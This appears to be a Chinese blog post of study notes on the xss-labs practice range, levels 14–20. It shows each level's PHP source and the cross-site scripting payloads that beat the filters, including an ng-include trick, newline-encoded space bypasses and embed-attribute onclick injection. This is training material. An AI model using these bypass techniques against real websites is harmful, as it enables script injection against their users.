+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;title&gt;欢迎来到level14&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;<br>&lt;center&gt;&lt;iframe name=<span class="hljs-string">&quot;leftframe&quot;</span> marginwidth=<span class="hljs-number">10</span> marginheight=<span class="hljs-number">10</span> src=<span class="hljs-string">&quot;http://www.exifviewer.org/&quot;</span> frameborder=no width=<span class="hljs-string">&quot;80%&quot;</span> scrolling=<span class="hljs-string">&quot;no&quot;</span> height=<span class="hljs-number">80</span>%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xss/level15.php?src=<span class="hljs-number">1</span>.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+<p>???<br>查了一下，网站是一个exif查看器用来查看图片信息的  </p>
+<p>那思考一下，竟然都是在我的前端上解析的，那我改host是不是能指向我想指向的ip？  </p>
+<p>和ai探讨了一下，在比赛中一般是有bot来当做用户来访问触发我的xss，而我是不能修改他们的host的  </p>
+<p>所以另一个方向是上传一张会返回xss的图片？  </p>
+<p>问题是在我的环境上无法打开网站，提示：  </p>
+<p>Please turn off your ad blocker.</p>
+<p>要我关掉我的广告拦截器？  </p>
+<p>关了edge的一个相关功能，还是打不开。  </p>
+<p>上网找wp吧。参考<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/282983.html">文章</a>  </p>
+<p>网站会解析图片的exif信息，然后返回到前端，在图片的exif里插入xss即可完成攻击  </p>
+<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>查看源码：  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html ng-app&gt;<br>&lt;head&gt;<br>        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>        &lt;script src=<span class="hljs-string">&quot;angular.min.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level16.php?keyword=test&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level15&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;h1 align=center&gt;欢迎来到第<span class="hljs-number">15</span>关，自己想个办法走出去吧！&lt;/h1&gt;<br>&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;src&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>只发现可src一个传入点，给ai看了一下，好像要有中间件绕过？  </p>
+<p>上网看wp：  </p>
+<p>ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号  </p>
+<p>竟然能直接包含第一关？  </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">所以可以随便包涵之前的一关并对其传参，以达到弹窗的效果，先测试一下过滤了啥，构造payload<br></code></pre></td></tr></table></figure>
+
+<p>所以就是攻击包含的代码来达到攻击的效果吗？  </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?src=&#x27;/level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;fff&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert()</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure>
+<p>通关<br>源wp是下面的payload：  </p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?src=&#x27;/level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert()</span>&gt;</span>&#x27;</span><br><span class="language-xml">```  </span><br><span class="language-xml"></span><br><span class="language-xml">## level 16  </span><br><span class="language-xml"></span><br><span class="language-xml">依旧偷看源码：  </span><br><span class="language-xml">```php</span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span></span><br><span class="language-javascript"><span class="language-xml">&#123;     </span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level17.php?arg01=a&amp;arg02=b&quot;</span>; </span></span><br><span class="language-javascript"><span class="language-xml">&#125;</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level16<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level16<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);</span><br><span class="language-php"><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);</span><br><span class="language-php"><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str</span>);</span><br><span class="language-php"><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str2</span>);</span><br><span class="language-php"><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str3</span>);</span><br><span class="language-php"><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;	&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str4</span>);</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&quot;</span>.<span class="hljs-variable">$str5</span>.<span class="hljs-string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level16.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str5</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>这都过滤了啥？  </p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">script</span><br>空格<br>/  (可以用来代替空格)<br></code></pre></td></tr></table></figure>
+
+<p>php的空格绕过是经典必考了，上网一查就有，<br>payload：  </p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;img%<span class="hljs-number">0</span>asrc<span class="hljs-operator">=</span><span class="hljs-string">&quot;fff&quot;</span>%<span class="hljs-number">0</span>aonerror<span class="hljs-operator">=</span>alert()&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h2><p>开题就显示插件不支持。。。。<br>前端html：  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>); </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level17<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level17<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">xsf01.swf?a</span>=<span class="hljs-string">b</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>成功后，<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>点我进入下一关<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>还是看看源码吧：  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>); <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level17&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&quot; width=100% heigth=100%&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>依旧看(wp)[<a target="_blank" rel="noopener" href="https://blog.csdn.net/l2872253606/article/details/125638898#:~:text=%E7%9B%AE%E5%BD%95level%201level%202level]">https://blog.csdn.net/l2872253606/article/details/125638898#:~:text=%E7%9B%AE%E5%BD%95level%201level%202level]</a>  </p>
+<p>大概是考了embad区域?   </p>
+<p>选择了改一下源码。。。<br>变成了：  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;embed src=indce.png?&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&quot; width=100% heigth=100%&gt;&quot;</span>;<br></code></pre></td></tr></table></figure>
+<p>尝试了：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=onclick&amp;arg02=alert(1)<br></code></pre></td></tr></table></figure>
+<p>不行，注意到写法里的引号<br>然而正确的payload为：  </p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?arg02= <span class="hljs-attribute">onclick</span>=alert()<br></code></pre></td></tr></table></figure>
+<p>少了个空格也不行  </p>
+<p>当为arg01时：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">index.png?</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">alert(1)</span>= <span class="hljs-string">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>成功后，<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>点我进入下一关<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>当为 ?arg01&#x3D;onclick&amp;arg02&#x3D;alert(1) 时：  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">index.png?onclick</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>成功后，<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>点我进入下一关<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>所以说只有当 ?arg02&#x3D; onclick&#x3D;alert() 才能构成：   </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">index.png?</span>= <span class="hljs-string">onclick</span>=<span class="hljs-string">alert()</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>成功后，<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>点我进入下一关<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>这时的 onclick&#x3D;alert() 才是生效的  </p>
+<h2 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h2><p>也是和上题一样改了一下源码：  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level19.php?arg01=a&amp;arg02=b&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level18&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level18&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;embed src=index.png?&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&quot; width=100% heigth=100%&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+<p>没看出来有啥区别，同一个payload过了：  </p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?arg02= <span class="hljs-attribute">onclick</span>=alert()<br></code></pre></td></tr></table></figure>
+
+<h2 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h2><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level20.php?arg01=a&amp;arg02=b&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level19&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level19&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;embed src=&quot;index.png?&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&#x27;&quot; width=100% heigth=100%&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+<p>需要绕过引号  </p>
+<p>看了网上wp，需要用flash的漏洞，现在网站很多都不用flash了  </p>
+<h2 id="level-20"><a href="#level-20" class="headerlink" title="level 20"></a>level 20</h2><p>还是考flash。。。  </p>
+<p>算了，放过我自己吧，，，   </p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>xss-labs-studynotes</div>
+      <div>https://aidemofashi.github.io/2025/10/01/xss-labs-studynotes/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>aidemofashi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年10月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/09/21/%E5%87%86%E5%A4%87%E8%AE%A1%E5%88%92/" title="准备计划">
+                        <span class="hidden-mobile">准备计划</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
